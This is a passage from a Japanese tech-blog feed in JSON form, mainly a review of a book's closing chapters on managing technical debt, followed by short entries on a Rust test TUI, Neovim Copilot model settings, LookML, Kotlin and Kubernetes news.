Solutionsパイロットプロジェクトの危険性と留意点第17章は技術的負債対策プログラムの実験的な試行段階に焦点を当てています。パイロットプロジェクトの危険性への警告から始まり、著者はマキャベリの「新しいものを導入するほど危険で不確実なものはない…改革者は古い条件下で成功した全ての人々を敵に回すからだ」という言葉を引用し、変革の難しさを強調しています。最も印象に残るのは「自身の利益のために悲劇を利用しようとする人がいるのなら、自組織内の誰かがパイロットプロジェクトを自己利益のために利用しようとすることは間違いない」という警告です。これは実務経験からも強く共感できるポイントです。以前関わったプロジェクトでは技術的負債対策パイロットの結果が特定のチームの予算削減を正当化する「証拠」として利用されかけたことがありました。パイロットの位置づけについて著者はCynefinフレームワークを参照し、技術的負債問題が「複雑（COMPLEX）」な領域に位置することを示しています。このような領域では完全に制御された実験が不可能であり、介入自体が問題の性質を変えてしまうことも考慮すべきです。そのため「介入が状況を悪化させるよりも改善する可能性が高い」という程度の証明で十分だとする著者の実用的なアプローチは説得力があります。リーン・スタートアップ　ムダのない起業プロセスでイノベーションを生みだす作者:エリック リース日経BPAmazonデータを活用した解決策の検証著者はパイロットプロジェクトなしで技術的負債を管理できる二つの状況を検討しています。一つはソリューション開発ワークショップで参加者が自分たちの権限内でできると特定した小さな項目のみに対処する方法、もう一つは過去のプロジェクトデータを使用する方法です。過去プロジェクトのデータを使用した例として、遅延した二つのプロジェクトの技術的負債蓄積パターンの違いが示されています。正確に見積もられたプロジェクト（20%遅延）では技術的負債が全期間を通じて均等に蓄積されていましたが、不正確な見積りのプロジェクト（60%遅延）では当初の締め切りを過ぎた後に技術的負債の蓄積率が急激に上昇していました。これは単なる印象や主観ではなく実際のデータに基づく証拠であり、技術的負債の管理において「プロジェクト遅延防止」が重要な戦略であることを示しています。この分析アプローチは現代のソフトウェア開発環境でも直接応用可能です。ユリシーズ契約を用いた負債管理著者はパイロットプロジェクトの具体例として「ユリシーズ契約」の実装と評価を提案しています。ユリシーズ契約とは将来の特定条件下で自分自身を拘束するために自発的に締結する合意です。技術的負債の文脈では、戦術的なプロジェクト問題を解決するために技術的負債を作成することを許容しつつ、その負債を返済するための時間と資金を確保するメカニズムを提供します。著者が提案するユリシーズ契約の設計で考慮すべき点は「望ましい行動を奨励し望ましくない行動を抑制する」という原則に基づき、高い透明性、高コスト負債の回避、組織全体にとって有利な場合のみ負債を受け入れるといった望ましい行動を促進する仕組みが必要だと指摘しています。特に興味深いのは「負債のコストをどのように分担するか」についての考察です。全てのコストを組織が負担するとプロジェクトはあらゆるものを技術的負債登録簿に追加しようとする一方、全てのコストをプロジェクトが負担するとほとんどの技術的負債項目が隠されて透明性が失われるというジレンマが生じます。これは単純な技術的問題ではなく、組織的なインセンティブ設計の問題であることを示しています。実務的には私はこのようなユリシーズ契約を「技術的負債バジェット」という形で実装したことがあります。各プロジェクトには一定量の「負債クレジット」が割り当てられ、期限内に納品する必要がある場合に「借用」できる仕組みです。重要なのはこの「借用」が明示的に記録され、返済計画が事前に合意されることです。パイロットの実施と結果分析著者はパイロットプロジェクト選定の基準として「適時性」「協力的なチーム」「小規模」「緊急性が低い」「短期間」といった要素を挙げています。特に注目すべきは「プロジェクトが遅延した場合実験が忘れられるリスク」や「さらに悪いことにスケジュール遅延の責任転嫁に使われるリスク」という警告です。パイロットプロジェクト実施の際、著者は「プロジェクト自体ではなく介入による技術的負債蓄積の変化に関する情報収集」に焦点を当てるべきと強調しています。プロジェクト運営自体に巻き込まれないよう注意しつつ、プロジェクトチームが持つ洞察や価値観を活用することが推奨されています。結果分析においては「これは正しい方向への一歩だったか」「コストよりも大きな助けになったか」という二つの基本的な質問に答えることを目指すべきです。また報告書は「忙しく注意力散漫なステークホルダー」を念頭に置き、明確で簡潔なメッセージを含めることが重要です。「人は数字が好き」「人はストーリーも好き」という著者の指摘は組織でのコミュニケーション経験からも非常に的確です。本章の最も重要なメッセージは技術的負債管理が単なる技術的問題ではなく、組織全体のプロセスと文化に関わる変革だということです。著者が提案するユリシーズ契約や段階的なパイロットプロジェクトアプローチはこの複雑な変革をより管理可能な形で実施するための実用的な方法です。最終的には組織の文化や構造に適合した「型」を見つけることが成功への鍵となります。技術的負債という「厄介な問題」に対処するための万能解決策は存在しませんが、明示的な契約、データに基づく意思決定、小規模から始めて学習するという原則を取り入れることで、組織は自分たちに適した持続可能な技術的負債管理アプローチを見つけることができるでしょう。18. Rollout and Stabilization組織変革としての技術的負債管理第18章は技術的負債削減プログラムの最終段階、組織全体への展開と定着に焦点を当てています。技術的負債への対処は単なる技術問題ではなく、組織全体の変革を必要とする取り組みであることが強調されています。マキャベリの「新しい秩序を導入することほど困難で危険で成功が不確かなものはない」という言葉は、技術的負債への取り組みにも当てはまります。変革管理の難しさは単に既存の負債を技術的に解決することではなく、人々の働き方を変えることにあるのです。技術的負債の解消が困難である理由は多岐にわたります。多くの人は技術的負債を技術問題と誤解し、本質がトレードオフ問題であることを認識していません。また常に他の「緊急」事項が優先される状況や、華々しい成果を上げにくい地道な取り組みであることも組織的な推進力を弱めています。技術的負債の返済に多額の投資を行う組織でさえ、その成果を定着させるためのプロセス変革に失敗するケースが多いのです。コッターの8ステップ変革プロセス本章ではジョン・コッターの8ステップ変革プロセスに焦点を当てています。このモデルは実証済みで広く使われ、豊富な文献とリソースがあり、関連経験を持つ変革管理の専門家も多いことから選ばれています。コッターのモデルはコミュニケーションと関係者の同意獲得に重点を置いています。明確な8つのステップが用意されていること、シンプルな実装方法、ステークホルダーの参画への強い焦点、緊急性の感覚を創出する点が利点として挙げられています。変革の8ステップとその実践緊急性の確立は技術的負債への取り組みにおいて特に難しい課題です。アイゼンハワー大統領の区分で言えば、技術的負債は「重要だが緊急でない問題」に該当します。効果的な緊急性を確立するためには、技術的負債の組織へのコスト試算、負債が引き起こした具体的な事例を物語として伝えるアプローチ、異なるレベルの技術的負債が開発コストに与える影響を動的シミュレーションモデルで可視化する方法などが有効です。ただし誇張された緊急性を作り出すことは「組織変革疲労」を引き起こす危険があります。著者は絶え間ない変革状態にあった組織での経験から、BOHICA(「また来たぞ、身構えろ」の意)という現場エンジニアの諦めの姿勢について触れています。強力な指導連合の形成も重要です。変革を成功させるには「強力」で「指導」する「連合」が必要です。パワーは変革を実行するための十分な権限を持ち、指導力は組織全体を導く能力、連合は技術的負債問題に取り組む共通の目的を持った集団を意味します。ビジョンの創造とコミュニケーションでは、明確で魅力的で信頼できるビジョンが必要です。このビジョンがあまりに複雑だったり曖昧だったりして5分以内で相手に伝えられないようでは失敗の原因となります。技術者向けには「負債に縛られずに望まれる機能を最良の方法で実装できる」というビジョン、利害関係者には「予測可能性と約束通りの機能提供」というビジョンを伝えるなど、対象によって異なるメッセージが必要かもしれません。ビジョンに基づく行動の促進においては、組織構造や強力な抵抗勢力がもたらす障壁を取り除く必要があります。変革への最大の障壁は現状に既得権益を持つ人々の抵抗です。例えばスプリントから無理やり追加のストーリーを絞り出すプロダクトマネージャー、実現不可能と知りながら受注する営業チーム、遅延プロジェクトで品質より機能を優先するステークホルダー、火消し作業に終始し根本的な改善に取り組まない「ヒーロー」など様々なパターンがあります。短期的成果の創出と定着化も欠かせません。ステークホルダーは合理的な期間内に改善の兆候が見えなければ変革への道を継続することはできません。そのため技術的負債削減プログラムには早期の成果を示せる取り組みを含めるべきです。これらの改善に貢献したチームメンバーを称えることで他のメンバーにも変革への動機付けができます。新しいアプローチの制度化が最終目標です。早期の成果による信頼性の向上を活用し、技術的負債の蓄積につながるシステム構造や方針の変更を主張しましょう。技術的負債の文脈では見積りプロセスの改善など根本的な原因に対処する変更が多く該当します。変革の成功要因変革プロジェクトの成功に共通する重要な要素には、測定可能なステークホルダーの目標の定義、全関係者への効果的なコミュニケーション、効果的なトレーニングプログラムの作成、抵抗の監視と対処、進捗の監視と微調整があります。技術的負債の解消は技術だけの問題ではなく組織全体の変革を必要とすることをこの章は強調しています。コッターの8ステップモデルは効果的な変革管理の枠組みを提供していますが、重要なのは組織の文化や特性に合わせたアプローチをとることです。技術的負債は連続的な問題であり、一度解決すれば終わりというものではありません。持続可能な解決策の構築には組織全体の継続的な取り組みとスキル構築が求められています。19. Conclusion魔法のボタンは存在しない著者は魅力的な比喩で最終章を始めています。もし寿命を延ばすボタンや体重を減らすボタンがあれば誰もが迷わず押すでしょう。しかしそのようなボタンは存在せず、健康的な生活習慣や適切な運動プログラムの継続が唯一の道です。同様にソフトウェアシステムの寿命を延ばす魔法のボタンも存在しません。一部のベンダーは「魔法の解決策」を売り込もうとしますがそれは幻想にすぎません。技術的負債に対する現実的なアプローチは「頭蓋骨に穴をあける」ような原始的な対症療法ではなく、世界の捉え方自体を変えることから始まります。慢性的な頭痛を食事や生活習慣、予防薬の組み合わせで治療するように、技術的負債も根本的な原因理解と持続的な対策が必要なのです。この取り組みには努力と満足の遅延が必要ですが、確かな道筋は存在します。ジェームズ・クリアー式 複利で伸びる1つの習慣作者:ジェームズ・クリアーパンローリング株式会社Amazon技術的負債の本質技術的負債の問題に立ち向かう際の最初の障壁は「負債」という類推自体の限界です。金融債務との類推は技術的でない利害関係者とのコミュニケーションに役立ちましたが、同時に誤解も生み出しました。この類推は技術的負債を主に「技術的な問題」と捉えさせますが、実際は「トレードオフの問題」なのです。新機能、早期デリバリー、直接コスト削減と引き換えに負債を抱え込む意思決定が本質的な課題です。トレードオフ決定は「affect heuristic（直感的判断）」に基づいて行われ、潜在意識で処理されるため歪みが生じやすく自覚することも困難です。本書を通じて学んだように、技術的負債はこの意思決定プロセスの歪みが組織システム内で増幅される結果なのです。技術的負債は単なる個人の意思決定の問題ではなく「システム問題」です。判断を行う個人は真空の中ではなく組織というシステムの中で意思決定を行います。彼らの役割とそれに伴う評価基準が負債に関する判断を歪めるのです。この問題が「厄介な問題（wicked problem）」であり、組織の社会的複雑性と相まって断片化したグループ間の対立を生み出すのです。技術的負債管理がもたらす恩恵こうした複雑な問題にもかかわらず、技術的負債を管理し高価なソフトウェアシステムの寿命を延ばすプログラムを構築することは可能です。技術的負債管理プログラムの構築が組織にもたらす三つの大きな恩恵を著者は強調しています。システムの寿命を50%以上延長することによる大幅なコスト削減。IT開発は既に組織予算の相当部分を占めており、人工知能など新技術の普及によってその割合は今後も増加することが予想されます。大規模なITプロジェクトによる混乱の減少。システム置き換えのような大規模プロジェクトはビジネスに大きな混乱をもたらしますが、技術的負債管理によりそうした必要性を減らすことができます。リスクの低減。ITおよびソフトウェアプロジェクトは本質的にリスクが高く、多くのプロジェクトが失敗します。機能しているシステムを技術的負債管理によって継続的に機能させ寿命を延ばすことは、組織にとってはるかにリスクの低い選択なのです。旅路への励まし著者は「技術的負債というドラゴンを飼いならす」ことが組織に大きな優位性をもたらすと結論づけています。そして読者への最後のメッセージとして「幸運」ではなく「勇気」を願っています。これは技術的負債との闘いが幸運頼みではなく、勇気を持って取り組むべき旅であることを示唆しています。技術的負債管理は単純な技術的解決や一時的な対策ではなく、組織の働き方、意思決定プロセス、評価システムにまで及ぶ包括的な変革です。それは困難な旅となりますが、組織の競争力、ソフトウェア資産の寿命、業務効率の向上に繋がる価値ある挑戦なのです。おわりにお疲れさまでした！長い旅路の末、ようやく技術的負債というドラゴンの本質が見えてきましたね。「単なる汚いコードでしょ？」と思っていた方は、それが実は「トレードオフの意思決定問題」「組織のシステム問題」「経済学的問題」そして「厄介な問題（wicked problem）」という複数の顔を持つ複雑な生き物だったことに気づかれたでしょう。私たちは皆、技術的負債という名の「マシュマロテスト」の前に立たされています。「今すぐひとつのマシュマロを食べるか、我慢して後で二つ食べるか」というあの有名な実験です。ソフトウェア開発の世界では「今すぐリリースして技術的負債を増やすか、時間をかけて正しく実装するか」という選択を迫られるわけです。もっとも、現実はそう単純ではありません。我慢して「正しく実装」したとしても、ビジネス要件の変更や技術の進化によって、約束の「二つ目のマシュマロ」が手に入らないこともあります。それでも、多くのプロジェクトは「締め切りが明日！」という時間の圧力の前に、リスクを考慮せずマシュマロを見るなり飛びつく3歳児のような選択をしがちです。「技術的負債を瞬時に返済できる魔法のボタン」を探し求めていた方には残念なお知らせがあります。最新のAI技術によってハードコードされた値の検出と修正は容易になりつつありますが、それでも技術的負債の全体を一瞬で解消するボタンはありません。チケットキューの山を一気に片付けるドラゴンボールでさえ、集めるのに時間と努力が必要なのです！あるのは地道なリファクタリングと品質管理という、継続的な改善活動だけです。でも、その「毎日続けること」こそが実は魔法なのかもしれません。無限病院 医院作者:韓 松早川書房Amazon最後まで読んでくれて本当にありがとうございます。途中で挫折せずに付き合ってくれたことに感謝しています。読者になってくれたら更に感謝です。Xまでフォロワーしてくれたら泣いているかもしれません。ドラゴンとの共存 - もうひとつのエピローグこの話の終わりに、もうひとつの物語を聞いてください。あれから3年が経ち、nwiizoの姿は大きく変わっていました。かつて彼を悩ませた「Cシステム」は、いまや彼が手なずけた技術的負債のドラゴンとなっていたのです。「どうしたんだ？また新機能の追加か？」nwiizoは画面の向こうのドラゴンに話しかけます。ドラゴンは小さく息を吐き、コード上に赤い警告を表示しました。「ありがとう、気づかなかった。この依存関係を追加したら循環参照になるところだった」nwiizoが最初にCシステムと対峙した日、彼はこのドラゴンを倒そうとしていました。「すべてを書き換えれば解決する」と、純粋すぎる情熱に燃えていたのです。しかし時間をかけて彼は大切な真実に気づきました。ドラゴンは倒すものではなく、共存するものだったのです。オフィスの壁には今、大きな「負債マップ」が掲げられています。技術的負債の「玉ねぎモデル」に基づき、技術層・トレードオフ層・システム層・経済学層・厄介な問題層という同心円が描かれています。チームメンバーはここに付箋を貼り、「高金利負債」には赤いマーカーで印をつけます。毎週金曜日の午後、彼らは「ドラゴンとのお茶会」と呼ばれるセッションを開きます。プロダクトオーナー、開発者、テスター、運用担当者が一堂に会し、今週作った負債と返済した負債について語り合うのです。「先週、納期を優先してユニットテストを省略したよね」とQAリードが言います。「うん、『ユリシーズ契約』に基づいて記録したよ。来週のスプリントで返済する約束をした」と開発者が答えます。nwiizoは微笑みながらこのやり取りを見ています。かつてはタブー視されていた「負債を作る決断」が、今は透明性を持って議論されているのです。彼の机の上には、「厄介な問題への挑み方」という本が開かれています。そこには彼の手書きのメモがあります。「技術的負債は複雑な問題だ。誰もが自分の視点から『解決策』を持っているが、誰も全体を見通せていない。重要なのは対話だ。異なる世界観を持つ人々が理解し合う場を作ること。」ある日、新入社員がnwiizoに尋ねました。「先輩、どうしてこんなに古いシステムを使っているんですか？最新のフレームワークで書き直せば、もっと効率的になると思いますが...」nwiizoはコーヒーを一口飲み、穏やかに答えました。「君はドラゴンを倒したいのかな？」新入社員は困惑した表情を浮かべます。「ドラゴンとは技術的負債のことだ。確かに彼は時に厄介で、時に怖い。でも実は私たちのプロジェクトの歴史そのものでもある。何年もの経験と学びが詰まった叡智だ。」nwiizoは立ち上がり、壁のチャートを指さしました。「見てごらん。私たちはすでに負債の70%を返済した。残りの30%は『低金利負債』か、あるいは返済コストが便益を上回る部分だ。完璧に負債ゼロのシステムを作ることが目標ではない。ビジネス価値を最大化しながら『管理可能な負債』を維持することが重要なんだ。」新入社員は考え込みます。「でも、いつか全部書き換える日は来るんですか？」「もちろん、その日は来るだろう。でも焦る必要はない。大切なのは毎日少しずつドラゴンと会話すること。負債を理解し、管理し、時には交渉することだ。それが本当の『ドラゴン使い』の仕事なんだよ。」その日の夕方、オフィスを出るnwiizoは、デスクの上のノートに次のスプリントの計画を書き残しました：「負債返済：20%、新機能：60%、実験：20%」ドラゴンは消えることはありませんでした。しかし今や、彼は恐れるべき敵ではなく、ともに歩むパートナーになっていたのです。時に手を焼かせるが、その炎は道を照らす光にもなる——そんな不思議な共存関係を築いたnwiizoの物語は、多くのエンジニアの心の支えとなったといいます。あなたのプロジェクトにも、きっとドラゴンは潜んでいるでしょう。それを倒そうとするのではなく、手なずけることを考えてみてはいかがでしょうか。最初の一歩は、ドラゴンの目を見て「こんにちは」と言うことから始まります。","isoDate":"2025-03-07T04:35:04.000Z","dateMiliSeconds":1741322104000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"StageCrewとは？マルチモーダルAIツールを触ってみた","link":"https://sreake.com/blog/research-multi-modal-tool-stagecrew/","contentSnippet":"StageCrew™️とは StageCrew™（https://stagecrew.ai/）は、システム監視やログ収集、トランザクションのトレースといった各種管理ツールに対するアクセスを自動化、インシデント発生時の対応 […]The post StageCrewとは？マルチモーダルAIツールを触ってみた first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2025-03-06T11:13:20.000Z","dateMiliSeconds":1741259600000,"authorName":"Sreake","authorId":"Sreake"},{"title":"LookMLって定数を定義できるの?","link":"https://zenn.dev/nedoko_dok0dko/articles/6d6bacc1a294b9","contentSnippet":"whatLookMLで定数を定義する事ができるのか調べてみた個人ログ Q.LookMLって定数を定義できるの?A. できるLookMLも他のプログラミング言語と同じように定数を設定できる。 定数の定義とマニフェストファイル マニフェストファイルLookMLにおいて、定数はマニフェストファイルというファイルを作成することによって定義する事ができる。https://cloud.google.com/looker/docs/lookml-project-files?hl=ja#project_manifest_filesマニフェストファイルは、定数の定義以外にも...","isoDate":"2025-03-06T10:53:04.000Z","dateMiliSeconds":1741258384000,"authorName":"seno","authorId":"seno"},{"title":"標準入出力テストを可視化するTUIツールの開発をした。","link":"https://syu-m-5151.hatenablog.com/entry/2025/03/04/160714","contentSnippet":"yamori demo gifgithub.comはじめに「あー、もう！競プロでテストの為にSolverを分けるの、マジで面倒くさい！」これが私がYamoriを作ったきっかけです。正直に言いましょう。私は怠け者です。AtCoderで問題を解くたびに、問題ごとにSolverを分けて、いちいちmain.rsを書き換えて...という作業が本当に億劫でした。標準入力でサクッとテストできないものかと常々思っていたのです。「標準入力でサクッとテストできないかな」と思いながら、コピペして実行して、出力を目視で確認する日々。ある日、特に複雑な問題で間違えたとき、「あれ？どのテストケースで落ちたっけ？」と混乱し、絶望的な気分になりました。そんな「プログラマーの怠惰」から生まれたのがYamoriです。「ヤモリ」という名前は、元々YAMLでテスト定義を書こうと思ったからです。（まあ、実際には「山守」という意味で、テストが私のコードを守ってくれるという願いも込めていますが、カッコいい理由なんて後付けです）「これでスッキリする！」という淡い期待競技プログラミングで使うRustのプログラムをテストするためだけに、Rustでテストツールを開発するという本末転倒な状況に、私は何の違和感も覚えませんでした。これぞ「釘を打つために、まず金槌を作るプログラマー」の鑑です。「単純な標準入出力のテストツールなんて、週末でサクッと作れるでしょ！」この甘い考えが、のちに何週間もの苦闘を招くとは思いもよりませんでした。ターミナルUIという沼「コマンドラインでテキスト出力するだけじゃつまらない。せっかくだから可視化もしたい！」この「せっかくだから」という言葉は、エンジニアの時間を無限に吸い取る魔法の呪文です。ratutuiというライブラリを見つけた瞬間、私は沼にハマりました。「タブがあって、色付きで、差分も表示できて、履歴も見れて...」気づけば、単純なテストツールのはずが、フルスクリーンのターミナルUIアプリケーションに進化していました。vim風のキーバインドを実装しながら「これ、競プロのテストに使うんだよね？」と自問自答する日々。言い訳のような機能たち最終的に、Yamoriには「競プロのテスト」という本来の目的を超えた様々な機能が実装されました：TOML/YAML形式のテスト定義（JSONじゃダメだったの？）履歴追跡機能（過去のテスト結果を見返す時間があるなら問題を解けよ）リリースモード切替（競プロでリリースビルド？本気？）カラフルな差分表示（赤と緑でお祭り気分）キーボードショートカット（vimmerの執着心）これらの機能を実装しながら、脳内では常に「ただテストするだけなのに...」というツッコミが再生され続けていました。しかし、完成したときの満足感は格別でした。最初のテストケースが緑色で「PASS」と表示されたとき、「こんなの作る時間があったら、もう10問解けてたな」と思いつつも、心のどこかでは「でも、これからはテストが楽になる！」という正当化が始まっていました。大切なものは ほしいものより先にきた結局のところ、Yamoriの開発は「標準入力でテストしたい」という単純な欲求から始まり、いつの間にか「立派なターミナルUIアプリ」へと成長しました。本当に必要だったのは単純なシェルスクリプトだったかもしれませんが、この回り道があったからこそ、Rustの理解も深まり、新しいライブラリにも触れられました。「効率的に競プロを解きたい」という目的からは大きく外れましたが、「プログラミングを楽しむ」という本質的な目的は達成できたのではないでしょうか。そして何より、次回のコンテストでテストケースを流し込むとき、「よっしゃYamori様様やな！」と密かに自己満足に浸れるのです。Yamoriを使ってみたいという変わり者の方は：cargo install yamoriで、この過剰なテストツールをインストールできます。あなたのターミナルをカラフルに彩るヤモリをぜひ体験してください！...そして私のように「本末転倒なツール開発」の罠に陥らないよう、ご注意を。","isoDate":"2025-03-04T07:07:14.000Z","dateMiliSeconds":1741072034000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"KotlinでAndroidアプリを作ってみる（超初級編）","link":"https://qiita.com/masaru-komiyama/items/8231c0e69d9fb54909aa","contentSnippet":"インフラ屋でもクソアプリを作りたくなる夜があるじゃない！と、言うことで本日は手元のMac端末でKotlinを触ってみようと思います。超初級編なので、あまり深い記事は期待しないでください。とりあ…","isoDate":"2025-03-03T13:22:04.000Z","dateMiliSeconds":1741008124000,"authorName":"masaru-komiyama","authorId":"masaru-komiyama"},{"title":"技術的負債と立ち向かう前に知っておいてもいいこと","link":"https://sreake.com/blog/think-about-technical-debt/","contentSnippet":"はじめに こんにちは、nwiizoです。開発チームの会話の中で「これは技術的負債だから後で対処しよう」という言葉をよく耳にします。納期に追われるプロジェクトでは、この「後で」が永遠の「いつか」になりがちです。結果として多 […]The post 技術的負債と立ち向かう前に知っておいてもいいこと first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2025-03-03T10:46:12.000Z","dateMiliSeconds":1740998772000,"authorName":"Sreake","authorId":"Sreake"},{"title":"ユーザーストーリーにこだわって、プロダクトバックログをスクラムチームが行う作業の唯一の情報源として成立させる","link":"https://sreake.com/blog/step-up-product-backlog-and-user-story-development/","contentSnippet":"Sreake事業部アプリケーション開発チームの安本です。 現在、スクラムでアプリケーション開発の概念検証（Proof of Concept; PoC）を進めています。 本記事では、スクラム開発を行っているチーム向けに、私 […]The post ユーザーストーリーにこだわって、プロダクトバックログをスクラムチームが行う作業の唯一の情報源として成立させる first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2025-03-03T01:17:49.000Z","dateMiliSeconds":1740964669000,"authorName":"Sreake","authorId":"Sreake"},{"title":"くちあだきみあむはしきぎ","link":"https://qiita.com/masaru-komiyama/items/0160cf23fbe2576f869c","contentSnippet":"おい！タイトルバグってんぞ！　と思われた皆様。安心してください。バグっておりません。電気回路を嗜んだ方なら、何かあったときについ口ずさんでしまう復活の呪文（まぁ色んな意味で記憶を呼び起こす呪文なの…","isoDate":"2025-03-02T12:57:49.000Z","dateMiliSeconds":1740920269000,"authorName":"masaru-komiyama","authorId":"masaru-komiyama"},{"title":"[2025/02/28] #kubenews 今週のKubernetes + Cloud Native + その他ニュース","link":"https://zenn.dev/bells17/articles/k8s-cloud-native-and-other-20250228","contentSnippet":"#kubenewsの2025年02月28日の回で話す、@bells17が最近気になったニュース記事をまとめたものです。自分が気になった今週のKubernetes + Cloud Native + その他なニュースをまるっとまとめておいて、その中から時間内に話せるものを話そうと思ってます。この記事自体はざっと読んで書いてるものが多いので、詳細はリンクとかで貼ってる記事の中を読んでもらった方が正確です。配信URL:https://www.youtube.com/live/e4qQt7sQ46Y 告知とかニュースっぽいもの コードを読んで理解するko buildhttps...","isoDate":"2025-02-28T10:19:14.000Z","dateMiliSeconds":1740737954000,"authorName":"bells17","authorId":"bells17"},{"title":"AIエージェント元年@日本生成AIユーザ会","link":"https://speakerdeck.com/shukob/aiezientoyuan-nian-at-ri-ben-sheng-cheng-aiyuzahui","contentSnippet":"https://genai-users.connpass.com/event/344332/\\r2024年は生成AIが世の中に浸透した1年でしたが、2025年はAIエージェント元年と言われています。\\r\\r生成AIはチャットベースで受け身なものでしたが、AIエージェントは自律的にタスクを分解しこなすことができます。そのインパクトは計り知れません。\\r\\r生成AIの概略を説明した後、AIエージェントの紹介をします。","isoDate":"2025-02-28T05:00:00.000Z","dateMiliSeconds":1740718800000,"authorName":"Shu Kobuchi","authorId":"kobuchi"},{"title":"Neovimで使うCopilotのモデルをClaudeに変更する苦労話 - 技術ブログ未満の個人的体験談","link":"https://syu-m-5151.hatenablog.com/entry/2025/02/27/184558","contentSnippet":"※カスハックの時間は終了して正式版に機能としてリリースされます。github.com免責事項: この記事は個人的な発見と試行錯誤を記録したものであり、正式なドキュメントに基づく推奨設定ではありません。ここで紹介する方法を実際の環境に適用する際は、十分な検証と自己責任でお願いします。はじめにこんにちは、Neovimユーザーのnwiizoです。今回は、NeovimでCopilotを使う際にAIモデルをClaudeに変更しようとして遭遇した「ちょっとした冒険」について共有したいと思います。最近、mizchiさんの最高のブログを読んだ。zenn.devこの記事を読んで魂を揺さぶられた。だが、まだVSCodeには移行しない。Neovimを使い続けることを決意した。揺らいだ。しかし、Neovim環境でもCopilotのAIモデルを自由に変更できたほうが良いと思い、特にClaudeモデルを試してみることにした。やりたかったこと最近、GitHub Copilotが Claude-3.7-sonnetなどのAnthropicのモデルをサポートするようになり、コーディング支援にもっと高度なAIの力を借りたいと思いました。GitHubの公式ドキュメント「Copilot Chat の AI モデルを変更する」によると、Copilot ChatのデフォルトLLMを別のモデルに変更できるようになっています。私のNeovim環境ではyetone/avante.nvimを使用してCopilotとの対話を行っていたので、このプラグインの設定でモデルを変更しようとしました。syu-m-5151.hatenablog.com最初の試み（失敗）まず試したのは、avante.nvimの設定で直接モデルを指定する方法です：{    \\"yetone/avante.nvim\\",    event = \\"VeryLazy\\",    lazy = false,    version = false,    opts = {      provider = \\"copilot\\", -- copilotを使用      auto_suggestions_provider = \\"copilot\\",      copilot = {        endpoint = \\"https://api.githubcopilot.com\\",        model = \\"claude-3.7-sonnet\\", -- ここでClaudeモデルを指定        timeout = 30000,        temperature = 0,        max_tokens = 4096,      },      -- 以下省略...    },    -- 依存関係などの設定...}しかし、この設定を適用してもなぜか期待通りの動作をしませんでした。デバッグを試みましたが、avante.nvimの設定だけではモデルの変更がうまく反映されていないようでした。というかこのような設定はたぶんなくて⋯。解決策：CopilotChat.nvimの力を借りる調査を進めるうちに、面倒になってCopilotC-Nvim/CopilotChat.nvimというプラグインの設定も変更しようと思いました。このプラグインはCopilotのチャットインターフェースを提供するもので、モデル設定も直接サポートしています。試しに以下の設定を追加してみました：-- Copilotチャット用の設定{  \\"CopilotC-Nvim/CopilotChat.nvim\\",  event = { \\"VeryLazy\\" },  branch = \\"main\\",  dependencies = {    { \\"zbirenbaum/copilot.lua\\" },    { \\"nvim-lua/plenary.nvim\\" },  },  opts = {    model = \\"claude-3.7-sonnet\\", -- モデル名を指定    debug = true, -- デバッグを有効化  },}そして驚いたことに、この設定を追加した後、avante.nvim側でもClaudeモデルが使われるようになりました！どうやら、CopilotChat.nvimの設定がcopilot.luaの基本設定に影響を与え、それがavante.nvimにも「引きずられて」反映されたようです。【注意】これは技術ブログ未満の個人的な発見であり、正式なドキュメントに基づくものではありません。このような依存関係による予期せぬ影響は、本番環境では深刻な問題を引き起こす可能性があります。設定の影響範囲を十分理解せずに適用すれば、システム全体に致命的な影響を及ぼす可能性があることを肝に銘じてください。なぜこうなったのか？正確な理由は不明ですが、おそらく両方のプラグインが同じzbirenbaum/copilot.luaに依存しており、この共通の依存関係を通じて設定が共有されたのだと思われます。CopilotChat.nvimがより直接的にCopilot APIとの連携部分を制御しているため、そちらでの設定が優先されたのでしょう。教訓Neovimのプラグインエコシステムでは、依存関係の連鎖によって予想外の相互作用が発生することがあります。今回のケースでは幸いにも望んだ結果につながりましたが、これは完全に「技術ブログ未満」の個人的な発見に過ぎません。警告: このような依存関係の連鎖による予期せぬ相互作用は、本番環境では極めて危険です。プラグイン間の隠れた依存関係による設定の「引きずり」は、デバッグが困難な問題を引き起こし、最悪の場合、本番システムの停止や重大なセキュリティ問題につながる可能性があります。設定変更の影響範囲を完全に理解しないまま適用することは、言わば地雷原を歩くようなものであることを忘れないでください。他の方も同様の状況に遭遇した場合、両方のプラグインを併用する方法が一つの解決策になるかもしれません。最終的な設定結局、私の設定はavante.nvimとCopilotChat.nvimの両方を含む形になりました：-- avante.nvimの設定（一部省略）{    \\"yetone/avante.nvim\\",    -- 省略...    opts = {      provider = \\"copilot\\",      auto_suggestions_provider = \\"copilot\\",      copilot = {        endpoint = \\"https://api.githubcopilot.com\\",        model = \\"claude-3.7-sonnet\\",        -- 省略...      },    },    -- 省略...},-- CopilotChat.nvimの設定{  \\"CopilotC-Nvim/CopilotChat.nvim\\",  event = { \\"VeryLazy\\" },  branch = \\"main\\",  dependencies = {    { \\"zbirenbaum/copilot.lua\\" },    { \\"nvim-lua/plenary.nvim\\" },  },  opts = {    model = \\"claude-3.7-sonnet\\",    debug = true,  },},これでNeovimでのコーディング体験がClaudeの能力で強化され、より的確なコード提案や説明が得られるようになりました。Neovimの設定は時に「魔法」のように思えることもありますが、それも含めて楽しいハック体験の一部なのでしょう。注：この記事は2025年2月時点の情報に基づいています。Copilotの仕様やプラグインの動作は変更される可能性があります。参考リンクGitHub Copilot Chat の AI モデルを変更する方法yetone/avante.nvimCopilotC-Nvim/CopilotChat.nvimzbirenbaum/copilot.lua","isoDate":"2025-02-27T09:45:58.000Z","dateMiliSeconds":1740649558000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"Google Cloud Model Armorによるプロンプトインジェクション対策","link":"https://sreake.com/blog/prompt-injection-protection-with-google-cloud-model-armor/","contentSnippet":"はじめに 昨年2024年は生成AIアプリケーションの開発が本格化し、RAG（Retrieval-Augmented Generation）が爆発的に流行した年でした。今年2025年はAIエージェントの年になると考えられて […]The post Google Cloud Model Armorによるプロンプトインジェクション対策 first appeared on sreake.com | 